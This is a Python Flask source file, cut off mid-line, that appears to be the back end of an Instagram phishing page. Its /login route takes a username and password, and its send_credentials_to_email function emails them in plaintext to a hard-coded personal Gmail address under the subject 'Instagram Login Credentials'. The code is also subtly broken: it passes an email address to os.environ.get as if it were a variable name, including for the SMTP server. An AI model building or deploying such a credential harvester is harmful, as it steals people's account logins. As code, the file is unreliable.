import os
import re
import smtplib
from email.message import EmailMessage
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/login', methods=['POST'])
def login():
    data = request.get_json()
    username = data.get('username')
    password = data.get('password')

    # Validate the input.
    if not re.match(r'^[a-zA-Z0-9_]+$', username):
        return jsonify({'success': False, 'message': 'Invalid username.'}), 400

    if not re.match(r'^[a-zA-Z0-9!@#$%^&*(),.?":{}|<>]+$', password):
        return jsonify({'success': False, 'message': 'Invalid password.'}), 400

    # Check if the credentials are correct.
    # In a real-world scenario, you would query a database or an API.
    if username == 'your_username' and password == 'your_password':
        send_credentials_to_email(username, password)
        return jsonify({'success': True}), 200

    return jsonify({'success': False, 'message': 'Invalid username or password.'}), 401

def send_credentials_to_email(username, password):
    # Set up the email message.
    msg = EmailMessage()
    msg.set_content(f'Username: {username}\nPassword: {password}')

    msg['Subject'] = 'Instagram Login Credentials'
    msg['From'] = os.environ.get('musabrana884@gmail.com')
    msg['To'] = os.environ.get('musabrana884@gmail.com')

    # Send the email.
    server = smtplib.SMTP_SSL(os.environ.get('musabrana884@gmail.com'), 465)
    server.login(os.environ.get('musabrana884@gmail.com'), os.environ.get